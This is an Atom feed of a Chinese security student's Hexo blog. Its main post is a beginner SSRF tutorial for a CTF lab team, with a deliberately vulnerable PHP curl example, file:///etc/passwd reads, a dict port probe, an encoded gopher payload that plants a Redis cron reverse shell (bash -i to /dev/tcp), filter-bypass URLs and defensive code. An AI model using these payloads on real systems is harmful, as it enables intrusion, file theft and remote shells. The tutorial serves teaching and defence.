<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoZ&#39;s Blog</title>
  
  <subtitle>Try My Best</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-23T12:49:18.011Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>xiaoZ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xctf_oj_web系列WP</title>
    <link href="http://yoursite.com/2019/09/19/xctf-oj-web%E7%B3%BB%E5%88%97WP/"/>
    <id>http://yoursite.com/2019/09/19/xctf-oj-web%E7%B3%BB%E5%88%97WP/</id>
    <published>2019-09-19T12:40:51.000Z</published>
    <updated>2019-12-23T12:49:18.011Z</updated>
    
    <content type="html"><![CDATA[<h1>xctf oj web系列</h1><p>xctf上的oj对ctf新手来说，算是比较友好的，由浅入深的题目，除了有一些脑洞题外，其他基本都还算是可以的，给实验室的ctf队伍做讲解交流，也是一直推荐大家去刷一下，出了新手村，把进阶题做好，基本对于一些常见的漏洞和题型能够有了解了。趁着有时间，整理一下之前的wp放上来，不仅可以提供给实验室同学参考，也希望能给其他想做这个平台上题目的人一些帮助。不过，做CTF题，还是建议先自己想，自己钻研，把能想的都想透，实在没办法了再看wp,给自己一些提示，然后继续去做，做完自己尝试复现，这样才能把一道题目吃得更深更透。</p><p>这一部分主要是web方面的一些题，其余misc、re、pwn等方向的后续会陆续整理放出。</p>]]></content>
    
    <summary type="html">
    
      xctf上的oj对ctf新手来说，算是比较友好的，由浅入深的题目，除了有一些脑洞题外，其他基本都还算是可以的，给实验室的ctf队伍做讲解交流，也是一直推荐大家去刷一下，出了新手村，把进阶题做好，基本对于一些常见的漏洞和题型能够有了解了。趁着有时间，整理一下之前的wp放上来，不仅可以提供给实验室同学参考，也希望能给其他想做这个平台上题目的人一些帮助。不过，做CTF题，还是建议先自己想，自己钻研，把能想的都想透，实在没办法了再看wp,给自己一些提示，然后继续去做，做完自己尝试复现，这样才能把一道题目吃得更深更透。
    
    </summary>
    
    
      <category term="CTF_web_wp" scheme="http://yoursite.com/categories/CTF-web-wp/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SSRF简介-小白文</title>
    <link href="http://yoursite.com/2019/09/15/SSRF%E7%AE%80%E4%BB%8B-%E5%B0%8F%E7%99%BD%E6%96%87/"/>
    <id>http://yoursite.com/2019/09/15/SSRF%E7%AE%80%E4%BB%8B-%E5%B0%8F%E7%99%BD%E6%96%87/</id>
    <published>2019-09-15T11:21:09.000Z</published>
    <updated>2019-12-23T12:45:13.281Z</updated>
    
    <content type="html"><![CDATA[<p>因为近期给实验室想做ctf web方向的同学做一些交流，所以回头对SSRF漏洞进行了一些总结和归纳，多数还是来自于网上的各种资料，部分为自己的一些理解。比较偏向基础，关于更加深入的东西，可以详看文中附的链接，分析些源码，复现下环境和攻击。</p><h2 id="漏洞简介">漏洞简介</h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者利用服务器提供的访问接口或参数来控制服务器端发起请求的一个安全漏洞。一般来说，SSRF攻击的目标是外网无法访问的内网系统（文件、主机、端口等）。之所以能够对内网进行访问，因为服务端对外网攻击者开放，而服务端本身是处于内网中的，由服务器本身发起的请求对于内网中的系统一般来说都是有效的。<br>归根到底，SSRF形成的原因在于服务端没有对，目标地址做过滤和限制，并且服务端对外提供了从其他服务器或应用获取数据的功能，这就导致请求和目标地址不可控制，在攻击者的精心构造下，利用服务端发送伪造的请求，使用有缺陷的web应用作为代理对服务端的网络系统进行攻击。</p><p>一个例子：<br>在php中，使用Curl进行资源访问请求</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">curl_init()       <span class="comment">//初始化一个curl会话</span></span><br><span class="line">curl_setopt()     <span class="comment">//设置一个curl传输选项</span></span><br><span class="line">    <span class="comment">//bool curl_setopt ( resource $ch , int $option , mixed $value )</span></span><br><span class="line">    <span class="comment">//ch：curl_init()返回的curl句柄</span></span><br><span class="line">    <span class="comment">//option：需要设置的CURLOPT_XXX选项</span></span><br><span class="line">    <span class="comment">//value：设置在option选项上的值</span></span><br><span class="line">    </span><br><span class="line">curl_exec()       <span class="comment">//执行一个curl会话</span></span><br><span class="line">curl_close()      <span class="comment">//关闭一个curl会话</span></span><br><span class="line"></span><br><span class="line">CURLOPT_URL    <span class="comment">//需要获取的URL地址，也可以在curl_init()函数中设置</span></span><br><span class="line">CURLOPT_FOLLOWLOCATION      <span class="comment">//启用时可将服务器返回的'Location'放在header递归</span></span><br><span class="line">                    <span class="comment">//的返回给服务使用CURLOPT_MAXREDIRS可以限定递归返回的数量</span></span><br><span class="line"> </span><br><span class="line">CURLOPT_HEADER      <span class="comment">//启用时会将头文件的信息作为数据流输出</span></span><br><span class="line">CURLOPT_PROTOCOLS   <span class="comment">//CURLPROTO_*的位域指，使用时可限定libcurl在传输过冲中可以</span></span><br><span class="line">                    <span class="comment">//使用的协议</span></span><br><span class="line">CURLPROTO_HTTP      <span class="comment">//指定libcurl使用http协议</span></span><br><span class="line">CURLPROTO_HTTPS     <span class="comment">//指定libcurl使用https协议</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，服务器允许用户通过指定URL，服务端使用curl发起网络请求后返回客户端，请求加载文件。<br>这利用上述代码的一个很简单的SSRF的例子，通过使用file协议访问服务端的其他数据文件：<br><a href="http://127.0.0.1/ssrf.php?url=file:///c:%5CUsers%5Ch%5CDesktop%5Chello.txt" target="_blank" rel="noopener">http://127.0.0.1/ssrf.php?url=file:///c:\Users\h\Desktop\hello.txt</a></p><p>综上，其实SSRF漏洞的根源在于对于请求没有进行过滤，从而导致攻击者可以利用服务端的web应用访问其他非授权的信息或文件</p><h2 id="SSRF主要攻击面">SSRF主要攻击面</h2><p>主要可实施的攻击<br>1.对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息(软件开发商，软件名称、版本、服务类型等信息，通过这些信息可以使用某些工具直接去使用相对应的exp去攻击)；<br>2.对内网或本地的应用程序进行攻击，攻击方式可能是溢出；<br>3.对内网的web应用进行指纹识别，通过访问默认文件实现；<br>4.攻击内网的web应用，主要为使用GET参数就可以进行的攻击（比如sqli、strusts2等）；<br>5.利用file协议读取本地文件等。</p><h2 id="SSRF漏洞出现的场景">SSRF漏洞出现的场景</h2><h3 id="漏洞出现的场景">漏洞出现的场景</h3><p>1.能够对外发起网络请求的地方，就可能存在SSRF漏洞；<br>2.从远程服务器请求资源（Upload from URL, Import &amp; Export RSS Feed）；<br>3.数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）；<br>4.Webmail收取其他邮箱插件（POP3、IMAP、SMTP）；<br>5.文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）。</p><h3 id="漏洞出现点">漏洞出现点</h3><p>1.分享：通过URL地址分享网页内容<br>2.转码服务<br>3.在线翻译<br>4.图片加载与下载：通过URL地址加载或下载图片<br>5.图片、文章收藏功能<br>6.未公开的api实现以及其他调用URL的功能<br>7.从URL关键字中寻找</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">share  </span><br><span class="line">wap  </span><br><span class="line">url</span><br><span class="line">file</span><br><span class="line">link  </span><br><span class="line">src  </span><br><span class="line"><span class="built_in">source</span>  </span><br><span class="line">target  </span><br><span class="line">u</span><br><span class="line">3g  </span><br><span class="line">display  </span><br><span class="line">sourceURl  </span><br><span class="line">imageURL  </span><br><span class="line">domain</span><br><span class="line">page</span><br><span class="line">file </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="PHP中容易造成漏洞的函数">PHP中容易造成漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec()   <span class="comment">//执行curl命令</span></span><br><span class="line">file_get_contents()    <span class="comment">//读取文件到字符串中</span></span><br><span class="line">fsockopen()   <span class="comment">//打开一个网络连接或者一个Unix套接字连接</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec">curl_exec()</h3><p>参考上文</p><h3 id="file-get-contents">file_get_contents()</h3><p>参考：<a href="https://www.php.net/manual/en/function.file-get-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.file-get-contents.php</a><br>格式：<br>file_get_contents(path,include_path,context,start,max_length)</p><p>与file()函数类似，但是这个函数可以从指定的开始位置读取指定长度的文件数据，并将文件读取成字符串中输出，如果读取失败，则返回FALSE。另外，如果操作系统支持，该函数可以使用内存映射来改善性能。<br>另：如果打开的URL中有特殊字符，则需要使用 urldecode() 进行URL编码<br>参数说明：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">path            <span class="comment">#必需，请求的文件名</span></span><br><span class="line">include_path    <span class="comment">#可选，如果需要在include_path（在 php.ini 中）中搜索文件的话，需要设置该参数为 '1'。</span></span><br><span class="line">context         <span class="comment">#可选，规定文件上下文句柄，context是一套可以修改流行为的选项，不使用可跳过</span></span><br><span class="line">start           <span class="comment">#可选，规定文件中开始读取的位置，从PHP 5.1开始使用</span></span><br><span class="line">max_length      <span class="comment">#可选，规定读取的字节数，从PHP5.1开始使用</span></span><br></pre></td></tr></table></figure><h3 id="fsockopen">fsockopen()</h3><p>参考：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//格式：</span></span><br><span class="line">fsockopen ( string $hostname [, int $port = <span class="number">-1</span> [, int &amp;$errno [, string &amp;$errstr [, float $timeout = ini_get(<span class="string">"default_socket_timeout"</span>) ]]]] ) : resource</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个套接字连接到指定主机（hostname）。</span></span><br><span class="line"><span class="comment">//PHP支持以下的套接字传输器类型列表 所支持的套接字传输器（Socket Transports）列表。也可以通过stream_get_transports()来获取套接字传输器支持类型。</span></span><br><span class="line"><span class="comment">//参数说明：</span></span><br><span class="line">hostname  <span class="comment">//如果安装了Openssl，则需要在主机名前添加访问协议ssl://或tls://，从而可以使用基于Openssl的客户端连接到远程主机</span></span><br><span class="line">port      <span class="comment">//端口号，如果将其设置为-1，则表示不使用端口，例如 unix://</span></span><br><span class="line">errno     <span class="comment">//如果errno返回值为0，则说明函数返回值为FALSE，错误发生在套接字连接调用之前，最可能的错误是在初始化套接字时发生了错误</span></span><br><span class="line">errstr    <span class="comment">//错误信息将以字符串的形式返回</span></span><br><span class="line">timeout   <span class="comment">//设置连接的时限，单位为s</span></span><br><span class="line">            <span class="comment">//如果要对套接字上的读写操作设置时间，使用straek_set_timeout(),timeout参数只用于套接字连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值：</span></span><br><span class="line"><span class="comment">//fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回FALSE。</span></span><br><span class="line"><span class="comment">//错误：</span></span><br><span class="line"><span class="comment">//如果host不可访问，则抛出一个警告级别（E_WARNING）的错误提示。</span></span><br></pre></td></tr></table></figure><h2 id="常见可利用协议">常见可利用协议</h2><p>常用协议参考：<br><a href="https://3wapp.github.io/WebSecurity/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/常见协议.html</a></p><p>一些常见的可利用的协议</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FILE                           <span class="comment">#读取服务器上任意文件内容</span></span><br><span class="line">IMAP/IMAPS/POP3SMTP/SMTPS      <span class="comment">#爆破邮件用户名密码</span></span><br><span class="line">FTP/FTPS                       <span class="comment">#FTP匿名访问、爆破</span></span><br><span class="line">DICT                           <span class="comment">#操作内网Redis等服务，扫描端口信息</span></span><br><span class="line">GOPHER                         <span class="comment">#能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞</span></span><br><span class="line">TFTP                           <span class="comment">#UDP协议扩展</span></span><br></pre></td></tr></table></figure><h3 id="dict">dict</h3><p>词典服务器协议（DICT）是基于TCP事务的查询/响应协议，它允许客户端从一组自然语言词典数据库访问词典定义。<br>DICT协议旨在提供对多个数据库的访问。可以请求单词定义，可以搜索单词索引（使用一组容易扩展的算法），可以提供有关服务器的信息（例如，支持哪些索引搜索策略，或者哪些数据库可用），以及信息可以提供有关数据库的信息（例如版权，引用或发行信息）。此外，DICT协议具有可用于限制对某些或所有数据库的访问的挂钩。</p><p>协议格式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;</span><br><span class="line">dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/m:&lt;word&gt;:&lt;database&gt;:&lt;strat&gt;:&lt;n&gt;</span><br></pre></td></tr></table></figure><p>其中，&quot;/d&quot; 语法指定DEFINE命令（RFC-2229 3.2节），而 “/m” 指定MATCH命令（RFC-2229 3.3节）。<br>“<user>;<auth>@”,&quot;:<port>&quot;,&quot;<database>&quot;,&quot;<strat>“和”<n>“中的某些或全部可能省略<br>通常省略”<n>&quot;，表示指定查询单词的第n个定义或匹配项。</p><p>如果省略 “<user>;<auth>@”，则不进行身份验证<br>如果省略 “: <port>“，则应使用默认端口2628<br>如果省略 &quot; <database>&quot; ，”!” 应该使用（见3.2节）<br>如果省略 “<strat>”，则为 “.”  应该使用（请参阅第3.3节）</p><p>“<user>; <auth> @” 指定用户名和执行的身份验证类型。<br>对于 “<auth>”，字符串 “AUTH” 指示将执行使用AUTH命令的APOP身份验证</p><p>字符串 “SASLAUTH = &lt;auth_type&gt;” 指示将使用SASLAUTH  和SASLRESP命令，其中 “&lt;auth_type&gt;” 表示将使用的SASL身份验证类型。如果为 “&lt;auth_type&gt;”</p><p>末尾的冒号可以省略，例如以下URL，可能指定定义或匹配项：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dict://dict.org/d:shortcake:</span><br><span class="line">dict://dict.org/d:shortcake:*</span><br><span class="line">dict://dict.org/d:shortcake:wordnet:</span><br><span class="line">dict://dict.org/d:shortcake:wordnet:1</span><br><span class="line">dict://dict.org/d:abcdefgh</span><br><span class="line">dict://dict.org/d:sun</span><br><span class="line">dict://dict.org/d:sun::1</span><br><span class="line"></span><br><span class="line">dict://dict.org/m:sun</span><br><span class="line">dict://dict.org/m:sun::soundex</span><br><span class="line">dict://dict.org/m:sun:wordnet::1</span><br><span class="line">dict://dict.org/m:sun::soundex:1</span><br><span class="line">dict://dict.org/m:sun:::</span><br></pre></td></tr></table></figure><h3 id="file">file</h3><p>本地文件传输协议，File Protocol。主要用于访问本地计算机中的文件。在ssrf中，可以利用其访问服务端本机的文件，在<br>参考：MSDN File Protocol<br>file协议的基本格式如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///文件路径</span><br></pre></td></tr></table></figure><p>比如需要打开E盘下txt目录中的index.txt，那么在资源管理器或者浏览器地址栏中输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///E:/txt/index.txt</span><br></pre></td></tr></table></figure><p>用file:///+文件地址，其实等价于文件的地址。即：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg</span><br></pre></td></tr></table></figure><p>URI中为什么本地文件file后面跟三个斜杠？<br>URI的结构为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scheme:[//[user:password@]host[:port]][/]path[?query][<span class="comment">#fragment]</span></span><br></pre></td></tr></table></figure><p>如果有host，前面需要加//，因此对于http或https等网络地址来说会写成：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/lishanleilixin/article/category/7191777</span><br></pre></td></tr></table></figure><p>这样看上去很自然。如果是文件的话，文件没有host，所以中间的host部分就不要了，就变成了:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///lishanleilixin/article/category/7191777</span><br></pre></td></tr></table></figure><p>因为如果没有host的话，第一个[]的内容就不存在了，这种同意的写法有一个标准叫CURIE。</p><h3 id="gopher">gopher</h3><p>Gopher 协议在SSRF中属于万金油，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。<br>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。<br>不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&amp;分隔符也要进行url编码。<br>总得来说，在SSRF中，基于 TCP Stream 且不做交互的点都可以进行攻击利用。利用Gopher将进行构造的TCP数据流发送到服务端实现攻击。<br>基本协议格式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><h2 id="利用方式">利用方式</h2><p>以上面的php代码为例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用file协议任意文件读取</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用dict协议查看端口</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用gopher协议反弹shell</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure><p>对上述进行防御<br>使用下面代码：<br>限制协议为HTTP、HTTPS<br>设置跳转重定向为True（默认不跳转）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时dict协议无效，但是可以利用302跳转来绕过http限制</p><h2 id="常见的过滤与绕过">常见的过滤与绕过</h2><h3 id="常见的过滤">常见的过滤</h3><p>过滤开头不是http://xxx.com的所有链接<br>过滤格式为ip的链接，比如127.0.0.1<br>结尾必须是某个后缀</p><h3 id="绕过方法">绕过方法</h3><p>http基础认证<br><a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a><br>利用302跳转（<a href="http://xip.io" target="_blank" rel="noopener">xip.io</a>，<a href="http://www.tinyrul.com" target="_blank" rel="noopener">www.tinyrul.com</a>）<br>• 当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.1<br>• 如果利用上面的方法会被检测127.0.0.1的话，可以利用www.tinyurl.com提供的服务来进行绕过<br>加上#或?即可<br>更改其他进制的ip</p><h2 id="防范方法">防范方法</h2><p>• 限制协议为HTTP、HTTPS<br>• 不用限制302重定向<br>• 设置URL白名单或者限制内网IP</p><h2 id="参考">参考</h2><p>SSRF详解：<br><a href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-漏洞学习/</a><br><a href="https://wcute.github.io/2018/12/12/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://wcute.github.io/2018/12/12/SSRF漏洞学习/</a><br><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">https://www.jianshu.com/p/86bb349baac1</a></p><p>SSRF环境复现：<br><a href="https://forum.90sec.com/t/topic/176" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/176</a><br>进阶环境搭建：<br><a href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" target="_blank" rel="noopener">https://github.com/incredibleindishell/SSRF_Vulnerable_Lab</a></p><p>Gopher-SSRF-redis:<br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf攻击内网应用复现/</a><br>Gopher-SSRF-MYSQL:<br><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6</a><br>利用Gopher扩展攻击面：<br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>]]></content>
    
    <summary type="html">
    
      关于SSRF的一些简单介绍，一些常见的攻击场景和攻击面，比较偏向基础。因为近期给实验室想做ctf web方向的同学做一些交流，所以回头对SSRF漏洞进行了一些总结和归纳，多数还是来自于网上的各种资料，部分为自己的一些理解。比较偏向基础，关于更加深入的东西，可以详看文中附的链接，分析些源码，复现下环境和攻击。
    
    </summary>
    
    
      <category term="Web漏洞介绍" scheme="http://yoursite.com/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/"/>
    
    
      <category term="Web漏洞" scheme="http://yoursite.com/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>写在前面</title>
    <link href="http://yoursite.com/2019/09/03/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/"/>
    <id>http://yoursite.com/2019/09/03/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/</id>
    <published>2019-09-03T11:40:56.000Z</published>
    <updated>2019-12-23T12:44:50.318Z</updated>
    
    <content type="html"><![CDATA[<p>终于，又回来了！</p><p>上次博客更新，还是在CSDN上，后续想自己搭建个博客，又因为各种原因没搭起来（归根到底还是懒…）<br>其实也不是没有写博客，很多内容都还静静躺在电脑硬盘里…<br>终于，现在终于狠下心弄好了，可以把之前积累的一些东西陆陆续续整理下发出来了。</p><h2 id="为什么写博客？">为什么写博客？</h2><p>为了记录，为了对自己所学的梳理，也是为了能够给你其他人提供一些参考和帮助。</p><p>记得最开始在CSDN上写博客，也没想那么多，还是因为班上同学间常会交流一些问题，有的时候自己嘴太笨，和大家挨个讲经常会有讲不清楚的地方，于是总觉得自己得有个地方，能够将这些学到的以及遇到的一些知识和问题记录下来，也能够给希望了解一些东西的同学或朋友一个也许能够获得参考的地方，于是，开始在CSDN上有了自己的博客。</p><p>但是令我没想到的是，自己写的这些东西，本来一直以为自己写的内容粗浅不堪琢磨，纯粹为了给同学间交流的内容，后来还是有挺多人看的，估计对于他们，那些文章多少还是能够有些帮助吧。</p><p>我想，博客的作用与价值，于自己而言，应该是通过梳理和记录，帮助自己更好地提升，加深自己的理解；而更大的价值在于，或许和自己志同道合的人能够在这里得到一些参考，一些启发，一些帮助？</p><h2 id="为什么不在CSDN上了？">为什么不在CSDN上了？</h2><p>有点丑算原因吗？确切地说，是因为想要有一个属于自己的空间，能够自己DIY的空间。而自己搭建博客，无疑是一个最好最符合的方法，不管是内容的书写上，还是页面的设计，以及空间和域名，都可以自己DIY，或许自己创造的才是最好的？</p><h2 id="That’s-all-欢迎来到这里，希望能够对你有所帮助。">That’s all, 欢迎来到这里，希望能够对你有所帮助。</h2>]]></content>
    
    <summary type="html">
    
      终于，又回来了！
    
    </summary>
    
    
    
  </entry>
  
</feed>
